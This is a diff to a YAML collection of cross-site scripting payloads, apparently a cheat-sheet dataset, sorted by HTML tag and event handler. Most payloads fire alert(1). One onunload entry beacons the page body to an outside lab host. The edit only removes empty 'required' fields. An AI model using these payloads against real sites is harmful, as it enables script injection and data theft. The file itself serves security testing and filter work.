     - chrome
@@ -1462,7 +1296,6 @@ body:
   onselectionchange:
     payloads:
     - <body onselectionchange=alert(1)>select some text
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -1470,7 +1303,6 @@ body:
   onselectstart:
     payloads:
     - <body onselectstart=alert(1)>select some text
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -1478,7 +1310,6 @@ body:
   ontouchend:
     payloads:
     - '<body ontouchend=alert(1)> '
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -1487,7 +1318,6 @@ body:
   ontouchmove:
     payloads:
     - '<body ontouchmove=alert(1)> '
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -1496,7 +1326,6 @@ body:
   ontouchstart:
     payloads:
     - '<body ontouchstart=alert(1)> '
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -1505,14 +1334,12 @@ body:
   onunhandledrejection:
     payloads:
     - <body onunhandledrejection=alert(1)><script>fetch('//xyz')</script>
-    required: []
     interaction: false
     browsers:
     - firefox
   onunload:
     payloads:
     - <body onunload=navigator.sendBeacon('//https://ssl.portswigger-labs.net/',document.body.innerHTML)>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -1520,7 +1347,6 @@ body:
   onwheel:
     payloads:
     - <body onwheel=alert(1)>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -1530,7 +1356,6 @@ br:
   onbeforecopy:
     payloads:
     - <br onbeforecopy="alert(1)" contenteditable>test</br>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -1539,7 +1364,6 @@ br:
   onbeforecut:
     payloads:
     - <br onbeforecut="alert(1)" contenteditable>test</br>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -1548,7 +1372,6 @@ br:
   onfocus:
     payloads:
     - <br id=x tabindex=1 onfocus=alert(1)></br>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -1556,7 +1379,6 @@ br:
   onfocusin:
     payloads:
     - <br id=x tabindex=1 onfocusin=alert(1)></br>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -1564,7 +1386,6 @@ br:
   onpaste:
     payloads:
     - <br onpaste="alert(1)" contenteditable>test</br>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -1574,7 +1395,6 @@ button:
   onbeforecopy:
     payloads:
     - <button onbeforecopy="alert(1)" contenteditable>test</button>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -1583,7 +1403,6 @@ button:
   onbeforecut:
     payloads:
     - <button onbeforecut="alert(1)" contenteditable>test</button>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -1592,7 +1411,6 @@ button:
   onfocus:
     payloads:
     - <button autofocus onfocus=alert(1)>test</button>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -1601,7 +1419,6 @@ button:
   onfocusin:
     payloads:
     - <button autofocus onfocusin=alert(1)>test</button>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -1610,7 +1427,6 @@ button:
   onpaste:
     payloads:
     - <button onpaste="alert(1)" contenteditable>test</button>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -1620,7 +1436,6 @@ canvas:
   onbeforecopy:
     payloads:
     - <canvas onbeforecopy="alert(1)" contenteditable>test</canvas>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -1629,7 +1444,6 @@ canvas:
   onbeforecut:
     payloads:
     - <canvas onbeforecut="alert(1)" contenteditable>test</canvas>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -1638,7 +1452,6 @@ canvas:
   onfocus:
     payloads:
     - <canvas id=x tabindex=1 onfocus=alert(1)></canvas>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -1646,7 +1459,6 @@ canvas:
   onfocusin:
     payloads:
     - <canvas id=x tabindex=1 onfocusin=alert(1)></canvas>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -1654,7 +1466,6 @@ canvas:
   onpaste:
     payloads:
     - <canvas onpaste="alert(1)" contenteditable>test</canvas>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -1664,7 +1475,6 @@ caption:
   onbeforecopy:
     payloads:
     - <caption onbeforecopy="alert(1)" contenteditable>test</caption>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -1673,7 +1483,6 @@ caption:
   onbeforecut:
     payloads:
     - <caption onbeforecut="alert(1)" contenteditable>test</caption>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -1682,7 +1491,6 @@ caption:
   onfocus:
     payloads:
     - <caption id=x tabindex=1 onfocus=alert(1)></caption>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -1690,7 +1498,6 @@ caption:
   onfocusin:
     payloads:
     - <caption id=x tabindex=1 onfocusin=alert(1)></caption>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -1698,7 +1505,6 @@ caption:
   onpaste:
     payloads:
     - <caption onpaste="alert(1)" contenteditable>test</caption>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -1708,7 +1514,6 @@ center:
   onbeforecopy:
     payloads:
     - <center onbeforecopy="alert(1)" contenteditable>test</center>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -1717,7 +1522,6 @@ center:
   onbeforecut:
     payloads:
     - <center onbeforecut="alert(1)" contenteditable>test</center>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -1726,7 +1530,6 @@ center:
   onfocus:
     payloads:
     - <center id=x tabindex=1 onfocus=alert(1)></center>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -1734,7 +1537,6 @@ center:
   onfocusin:
     payloads:
     - <center id=x tabindex=1 onfocusin=alert(1)></center>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -1742,7 +1544,6 @@ center:
   onpaste:
     payloads:
     - <center onpaste="alert(1)" contenteditable>test</center>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -1752,7 +1553,6 @@ cite:
   onbeforecopy:
     payloads:
     - <cite onbeforecopy="alert(1)" contenteditable>test</cite>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -1761,7 +1561,6 @@ cite:
   onbeforecut:
     payloads:
     - <cite onbeforecut="alert(1)" contenteditable>test</cite>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -1770,7 +1569,6 @@ cite:
   onfocus:
     payloads:
     - <cite id=x tabindex=1 onfocus=alert(1)></cite>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -1778,7 +1576,6 @@ cite:
   onfocusin:
     payloads:
     - <cite id=x tabindex=1 onfocusin=alert(1)></cite>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -1786,7 +1583,6 @@ cite:
   onpaste:
     payloads:
     - <cite onpaste="alert(1)" contenteditable>test</cite>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -1796,7 +1592,6 @@ code:
   onbeforecopy:
     payloads:
     - <code onbeforecopy="alert(1)" contenteditable>test</code>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -1805,7 +1600,6 @@ code:
   onbeforecut:
     payloads:
     - <code onbeforecut="alert(1)" contenteditable>test</code>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -1814,7 +1608,6 @@ code:
   onfocus:
     payloads:
     - <code id=x tabindex=1 onfocus=alert(1)></code>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -1822,7 +1615,6 @@ code:
   onfocusin:
     payloads:
     - <code id=x tabindex=1 onfocusin=alert(1)></code>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -1830,7 +1622,6 @@ code:
   onpaste:
     payloads:
     - <code onpaste="alert(1)" contenteditable>test</code>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -1840,7 +1631,6 @@ col:
   onbeforecopy:
     payloads:
     - <col onbeforecopy="alert(1)" contenteditable>test</col>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -1849,7 +1639,6 @@ col:
   onbeforecut:
     payloads:
     - <col onbeforecut="alert(1)" contenteditable>test</col>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -1858,7 +1647,6 @@ col:
   onfocus:
     payloads:
     - <col id=x tabindex=1 onfocus=alert(1)></col>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -1866,7 +1654,6 @@ col:
   onfocusin:
     payloads:
     - <col id=x tabindex=1 onfocusin=alert(1)></col>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -1874,7 +1661,6 @@ col:
   onpaste:
     payloads:
     - <col onpaste="alert(1)" contenteditable>test</col>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -1884,7 +1670,6 @@ colgroup:
   onbeforecopy:
     payloads:
     - <colgroup onbeforecopy="alert(1)" contenteditable>test</colgroup>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -1893,7 +1678,6 @@ colgroup:
   onbeforecut:
     payloads:
     - <colgroup onbeforecut="alert(1)" contenteditable>test</colgroup>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -1902,7 +1686,6 @@ colgroup:
   onfocus:
     payloads:
     - <colgroup id=x tabindex=1 onfocus=alert(1)></colgroup>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -1910,7 +1693,6 @@ colgroup:
   onfocusin:
     payloads:
     - <colgroup id=x tabindex=1 onfocusin=alert(1)></colgroup>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -1918,7 +1700,6 @@ colgroup:
   onpaste:
     payloads:
     - <colgroup onpaste="alert(1)" contenteditable>test</colgroup>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -1928,7 +1709,6 @@ command:
   onbeforecopy:
     payloads:
     - <command onbeforecopy="alert(1)" contenteditable>test</command>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -1937,7 +1717,6 @@ command:
   onbeforecut:
     payloads:
     - <command onbeforecut="alert(1)" contenteditable>test</command>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -1946,7 +1725,6 @@ command:
   onfocus:
     payloads:
     - <command id=x tabindex=1 onfocus=alert(1)></command>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -1954,7 +1732,6 @@ command:
   onfocusin:
     payloads:
     - <command id=x tabindex=1 onfocusin=alert(1)></command>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -1962,7 +1739,6 @@ command:
   onpaste:
     payloads:
     - <command onpaste="alert(1)" contenteditable>test</command>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -1972,7 +1748,6 @@ content:
   onbeforecopy:
     payloads:
     - <content onbeforecopy="alert(1)" contenteditable>test</content>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -1981,7 +1756,6 @@ content:
   onbeforecut:
     payloads:
     - <content onbeforecut="alert(1)" contenteditable>test</content>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -1990,7 +1764,6 @@ content:
   onfocus:
     payloads:
     - <content id=x tabindex=1 onfocus=alert(1)></content>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -1998,7 +1771,6 @@ content:
   onfocusin:
     payloads:
     - <content id=x tabindex=1 onfocusin=alert(1)></content>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -2006,7 +1778,6 @@ content:
   onpaste:
     payloads:
     - <content onpaste="alert(1)" contenteditable>test</content>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -2016,7 +1787,6 @@ custom tags:
   onfocus:
     payloads:
     - <xss id=x tabindex=1 onfocus=alert(1)></xss>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -2024,7 +1794,6 @@ custom tags:
   onfocusin:
     payloads:
     - <xss id=x tabindex=1 onfocusin=alert(1)></xss>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -2033,7 +1802,6 @@ data:
   onbeforecopy:
     payloads:
     - <data onbeforecopy="alert(1)" contenteditable>test</data>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -2042,7 +1810,6 @@ data:
   onbeforecut:
     payloads:
     - <data onbeforecut="alert(1)" contenteditable>test</data>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -2051,7 +1818,6 @@ data:
   onfocus:
     payloads:
     - <data id=x tabindex=1 onfocus=alert(1)></data>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -2059,7 +1825,6 @@ data:
   onfocusin:
     payloads:
     - <data id=x tabindex=1 onfocusin=alert(1)></data>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -2067,7 +1832,6 @@ data:
   onpaste:
     payloads:
     - <data onpaste="alert(1)" contenteditable>test</data>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -2077,7 +1841,6 @@ datalist:
   onbeforecopy:
     payloads:
     - <datalist onbeforecopy="alert(1)" contenteditable>test</datalist>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -2086,7 +1849,6 @@ datalist:
   onbeforecut:
     payloads:
     - <datalist onbeforecut="alert(1)" contenteditable>test</datalist>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -2095,7 +1857,6 @@ datalist:
   onfocus:
     payloads:
     - <datalist id=x tabindex=1 onfocus=alert(1)></datalist>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -2103,7 +1864,6 @@ datalist:
   onfocusin:
     payloads:
     - <datalist id=x tabindex=1 onfocusin=alert(1)></datalist>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -2111,7 +1871,6 @@ datalist:
   onpaste:
     payloads:
     - <datalist onpaste="alert(1)" contenteditable>test</datalist>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -2121,7 +1880,6 @@ dd:
   onbeforecopy:
     payloads:
     - <dd onbeforecopy="alert(1)" contenteditable>test</dd>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -2130,7 +1888,6 @@ dd:
   onbeforecut:
     payloads:
     - <dd onbeforecut="alert(1)" contenteditable>test</dd>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -2139,7 +1896,6 @@ dd:
   onfocus:
     payloads:
     - <dd id=x tabindex=1 onfocus=alert(1)></dd>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -2147,7 +1903,6 @@ dd:
   onfocusin:
     payloads:
     - <dd id=x tabindex=1 onfocusin=alert(1)></dd>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -2155,7 +1910,6 @@ dd:
   onpaste:
     payloads:
     - <dd onpaste="alert(1)" contenteditable>test</dd>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -2165,7 +1919,6 @@ del:
   onbeforecopy:
     payloads:
     - <del onbeforecopy="alert(1)" contenteditable>test</del>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -2174,7 +1927,6 @@ del:
   onbeforecut:
     payloads:
     - <del onbeforecut="alert(1)" contenteditable>test</del>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -2183,7 +1935,6 @@ del:
   onfocus:
     payloads:
     - <del id=x tabindex=1 onfocus=alert(1)></del>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -2191,7 +1942,6 @@ del:
   onfocusin:
     payloads:
     - <del id=x tabindex=1 onfocusin=alert(1)></del>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -2199,7 +1949,6 @@ del:
   onpaste:
     payloads:
     - <del onpaste="alert(1)" contenteditable>test</del>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -2209,7 +1958,6 @@ details:
   onbeforecopy:
     payloads:
     - <details onbeforecopy="alert(1)" contenteditable>test</details>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -2218,7 +1966,6 @@ details:
   onbeforecut:
     payloads:
     - <details onbeforecut="alert(1)" contenteditable>test</details>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -2227,7 +1974,6 @@ details:
   onfocus:
     payloads:
     - <details id=x tabindex=1 onfocus=alert(1)></details>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -2235,7 +1981,6 @@ details:
   onfocusin:
     payloads:
     - <details id=x tabindex=1 onfocusin=alert(1)></details>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -2243,7 +1988,6 @@ details:
   onpaste:
     payloads:
     - <details onpaste="alert(1)" contenteditable>test</details>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -2252,7 +1996,6 @@ details:
   ontoggle:
     payloads:
     - <details ontoggle=alert(1) open>test</details>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -2262,7 +2005,6 @@ dfn:
   onbeforecopy:
     payloads:
     - <dfn onbeforecopy="alert(1)" contenteditable>test</dfn>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -2271,7 +2013,6 @@ dfn:
   onbeforecut:
     payloads:
     - <dfn onbeforecut="alert(1)" contenteditable>test</dfn>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -2280,7 +2021,6 @@ dfn:
   onfocus:
     payloads:
     - <dfn id=x tabindex=1 onfocus=alert(1)></dfn>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -2288,7 +2028,6 @@ dfn:
   onfocusin:
     payloads:
     - <dfn id=x tabindex=1 onfocusin=alert(1)></dfn>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -2296,7 +2035,6 @@ dfn:
   onpaste:
     payloads:
     - <dfn onpaste="alert(1)" contenteditable>test</dfn>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -2306,7 +2044,6 @@ dialog:
   onbeforecopy:
     payloads:
     - <dialog onbeforecopy="alert(1)" contenteditable>test</dialog>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -2315,7 +2052,6 @@ dialog:
   onbeforecut:
     payloads:
     - <dialog onbeforecut="alert(1)" contenteditable>test</dialog>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -2324,7 +2060,6 @@ dialog:
   onclose:
     payloads:
     - <dialog open onclose=alert(1)><form method=dialog><button>XSS</button></form>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -2333,7 +2068,6 @@ dialog:
   onfocus:
     payloads:
     - <dialog id=x tabindex=1 onfocus=alert(1)></dialog>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -2341,7 +2075,6 @@ dialog:
   onfocusin:
     payloads:
     - <dialog id=x tabindex=1 onfocusin=alert(1)></dialog>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -2349,7 +2082,6 @@ dialog:
   onpaste:
     payloads:
     - <dialog onpaste="alert(1)" contenteditable>test</dialog>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -2359,7 +2091,6 @@ dir:
   onbeforecopy:
     payloads:
     - <dir onbeforecopy="alert(1)" contenteditable>test</dir>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -2368,7 +2099,6 @@ dir:
   onbeforecut:
     payloads:
     - <dir onbeforecut="alert(1)" contenteditable>test</dir>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -2377,7 +2107,6 @@ dir:
   onfocus:
     payloads:
     - <dir id=x tabindex=1 onfocus=alert(1)></dir>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -2385,7 +2114,6 @@ dir:
   onfocusin:
     payloads:
     - <dir id=x tabindex=1 onfocusin=alert(1)></dir>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -2393,7 +2121,6 @@ dir:
   onpaste:
     payloads:
     - <dir onpaste="alert(1)" contenteditable>test</dir>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -2403,7 +2130,6 @@ div:
   onbeforecopy:
     payloads:
     - <div onbeforecopy="alert(1)" contenteditable>test</div>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -2412,7 +2138,6 @@ div:
   onbeforecut:
     payloads:
     - <div onbeforecut="alert(1)" contenteditable>test</div>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -2421,7 +2146,6 @@ div:
   onfocus:
     payloads:
     - <div id=x tabindex=1 onfocus=alert(1)></div>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -2429,7 +2153,6 @@ div:
   onfocusin:
     payloads:
     - <div id=x tabindex=1 onfocusin=alert(1)></div>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -2437,7 +2160,6 @@ div:
   onpaste:
     payloads:
     - <div onpaste="alert(1)" contenteditable>test</div>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -2447,7 +2169,6 @@ dl:
   onbeforecopy:
     payloads:
     - <dl onbeforecopy="alert(1)" contenteditable>test</dl>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -2456,7 +2177,6 @@ dl:
   onbeforecut:
     payloads:
     - <dl onbeforecut="alert(1)" contenteditable>test</dl>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -2465,7 +2185,6 @@ dl:
   onfocus:
     payloads:
     - <dl id=x tabindex=1 onfocus=alert(1)></dl>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -2473,7 +2192,6 @@ dl:
   onfocusin:
     payloads:
     - <dl id=x tabindex=1 onfocusin=alert(1)></dl>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -2481,7 +2199,6 @@ dl:
   onpaste:
     payloads:
     - <dl onpaste="alert(1)" contenteditable>test</dl>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -2491,7 +2208,6 @@ dt:
   onbeforecopy:
     payloads:
     - <dt onbeforecopy="alert(1)" contenteditable>test</dt>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -2500,7 +2216,6 @@ dt:
   onbeforecut:
     payloads:
     - <dt onbeforecut="alert(1)" contenteditable>test</dt>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -2509,7 +2224,6 @@ dt:
   onfocus:
     payloads:
     - <dt id=x tabindex=1 onfocus=alert(1)></dt>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -2517,7 +2231,6 @@ dt:
   onfocusin:
     payloads:
     - <dt id=x tabindex=1 onfocusin=alert(1)></dt>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -2525,7 +2238,6 @@ dt:
   onpaste:
     payloads:
     - <dt onpaste="alert(1)" contenteditable>test</dt>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -2535,7 +2247,6 @@ element:
   onbeforecopy:
     payloads:
     - <element onbeforecopy="alert(1)" contenteditable>test</element>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -2544,7 +2255,6 @@ element:
   onbeforecut:
     payloads:
     - <element onbeforecut="alert(1)" contenteditable>test</element>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -2553,7 +2263,6 @@ element:
   onfocus:
     payloads:
     - <element id=x tabindex=1 onfocus=alert(1)></element>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -2561,7 +2270,6 @@ element:
   onfocusin:
     payloads:
     - <element id=x tabindex=1 onfocusin=alert(1)></element>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -2569,7 +2277,6 @@ element:
   onpaste:
     payloads:
     - <element onpaste="alert(1)" contenteditable>test</element>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -2579,7 +2286,6 @@ em:
   onbeforecopy:
     payloads:
     - <em onbeforecopy="alert(1)" contenteditable>test</em>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -2588,7 +2294,6 @@ em:
   onbeforecut:
     payloads:
     - <em onbeforecut="alert(1)" contenteditable>test</em>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -2597,7 +2302,6 @@ em:
   onfocus:
     payloads:
     - <em id=x tabindex=1 onfocus=alert(1)></em>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -2605,7 +2309,6 @@ em:
   onfocusin:
     payloads:
     - <em id=x tabindex=1 onfocusin=alert(1)></em>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -2613,7 +2316,6 @@ em:
   onpaste:
     payloads:
     - <em onpaste="alert(1)" contenteditable>test</em>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -2623,7 +2325,6 @@ embed:
   onbeforecopy:
     payloads:
     - <embed onbeforecopy="alert(1)" contenteditable>test</embed>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -2632,7 +2333,6 @@ embed:
   onbeforecut:
     payloads:
     - <embed onbeforecut="alert(1)" contenteditable>test</embed>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -2641,7 +2341,6 @@ embed:
   onerror:
     payloads:
     - <embed src=1 onerror=alert(1) type=image/gif>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -2649,7 +2348,6 @@ embed:
   onfocus:
     payloads:
     - <embed id=x onfocus=alert(1) type=text/html>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -2657,7 +2355,6 @@ embed:
   onfocusin:
     payloads:
     - <embed id=x onfocusin=alert(1) type=text/html>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -2665,7 +2362,6 @@ embed:
   onload:
     payloads:
     - <embed src=/ onload=alert(1)>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -2674,7 +2370,6 @@ embed:
   onpaste:
     payloads:
     - <embed onpaste="alert(1)" contenteditable>test</embed>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -2684,7 +2379,6 @@ fieldset:
   onbeforecopy:
     payloads:
     - <fieldset onbeforecopy="alert(1)" contenteditable>test</fieldset>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -2693,7 +2387,6 @@ fieldset:
   onbeforecut:
     payloads:
     - <fieldset onbeforecut="alert(1)" contenteditable>test</fieldset>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -2702,7 +2395,6 @@ fieldset:
   onfocus:
     payloads:
     - <fieldset id=x tabindex=1 onfocus=alert(1)></fieldset>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -2710,7 +2402,6 @@ fieldset:
   onfocusin:
     payloads:
     - <fieldset id=x tabindex=1 onfocusin=alert(1)></fieldset>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -2718,7 +2409,6 @@ fieldset:
   onpaste:
     payloads:
     - <fieldset onpaste="alert(1)" contenteditable>test</fieldset>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -2728,7 +2418,6 @@ figcaption:
   onbeforecopy:
     payloads:
     - <figcaption onbeforecopy="alert(1)" contenteditable>test</figcaption>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -2737,7 +2426,6 @@ figcaption:
   onbeforecut:
     payloads:
     - <figcaption onbeforecut="alert(1)" contenteditable>test</figcaption>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -2746,7 +2434,6 @@ figcaption:
   onfocus:
     payloads:
     - <figcaption id=x tabindex=1 onfocus=alert(1)></figcaption>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -2754,7 +2441,6 @@ figcaption:
   onfocusin:
     payloads:
     - <figcaption id=x tabindex=1 onfocusin=alert(1)></figcaption>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -2762,7 +2448,6 @@ figcaption:
   onpaste:
     payloads:
     - <figcaption onpaste="alert(1)" contenteditable>test</figcaption>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -2772,7 +2457,6 @@ figure:
   onbeforecopy:
     payloads:
     - <figure onbeforecopy="alert(1)" contenteditable>test</figure>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -2781,7 +2465,6 @@ figure:
   onbeforecut:
     payloads:
     - <figure onbeforecut="alert(1)" contenteditable>test</figure>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -2790,7 +2473,6 @@ figure:
   onfocus:
     payloads:
     - <figure id=x tabindex=1 onfocus=alert(1)></figure>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -2798,7 +2480,6 @@ figure:
   onfocusin:
     payloads:
     - <figure id=x tabindex=1 onfocusin=alert(1)></figure>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -2806,7 +2487,6 @@ figure:
   onpaste:
     payloads:
     - <figure onpaste="alert(1)" contenteditable>test</figure>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -2816,7 +2496,6 @@ font:
   onbeforecopy:
     payloads:
     - <font onbeforecopy="alert(1)" contenteditable>test</font>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -2825,7 +2504,6 @@ font:
   onbeforecut:
     payloads:
     - <font onbeforecut="alert(1)" contenteditable>test</font>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -2834,7 +2512,6 @@ font:
   onfocus:
     payloads:
     - <font id=x tabindex=1 onfocus=alert(1)></font>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -2842,7 +2519,6 @@ font:
   onfocusin:
     payloads:
     - <font id=x tabindex=1 onfocusin=alert(1)></font>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -2850,7 +2526,6 @@ font:
   onpaste:
     payloads:
     - <font onpaste="alert(1)" contenteditable>test</font>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -2860,7 +2535,6 @@ footer:
   onbeforecopy:
     payloads:
     - <footer onbeforecopy="alert(1)" contenteditable>test</footer>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -2869,7 +2543,6 @@ footer:
   onbeforecut:
     payloads:
     - <footer onbeforecut="alert(1)" contenteditable>test</footer>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -2878,7 +2551,6 @@ footer:
   onfocus:
     payloads:
     - <footer id=x tabindex=1 onfocus=alert(1)></footer>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -2886,7 +2558,6 @@ footer:
   onfocusin:
     payloads:
     - <footer id=x tabindex=1 onfocusin=alert(1)></footer>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -2894,7 +2565,6 @@ footer:
   onpaste:
     payloads:
     - <footer onpaste="alert(1)" contenteditable>test</footer>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -2904,7 +2574,6 @@ form:
   onbeforecopy:
     payloads:
     - <form onbeforecopy="alert(1)" contenteditable>test</form>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -2913,7 +2582,6 @@ form:
   onbeforecut:
     payloads:
     - <form onbeforecut="alert(1)" contenteditable>test</form>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -2922,7 +2590,6 @@ form:
